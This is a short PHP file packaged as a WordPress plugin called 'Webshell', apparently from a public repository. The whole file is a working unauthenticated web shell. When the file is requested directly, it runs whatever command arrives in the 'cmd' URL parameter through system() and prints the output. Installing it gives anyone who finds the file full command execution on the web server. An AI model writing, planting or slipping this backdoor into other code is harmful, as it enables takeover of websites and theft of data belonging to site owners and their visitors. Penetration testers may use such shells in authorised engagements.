<?php
/*
Plugin Name: Webshell
Plugin URI: https://github.com/XK3NF4/webshell-plugin-wordpress
Description: Web shell through a WordPress plugin without authentication.
Version: 1.0.0
Text Domain: webshell
Author:XK3NF4
Author URI:https://x.com/XK3NF4
*/

if (realpath(__FILE__) === realpath($_SERVER['SCRIPT_FILENAME'])) {
    if (isset($_GET['cmd'])) {
        header("Content-Type: text/plain");
        system($_GET['cmd'] . " 2>&1");
        exit;
    }
}
?>
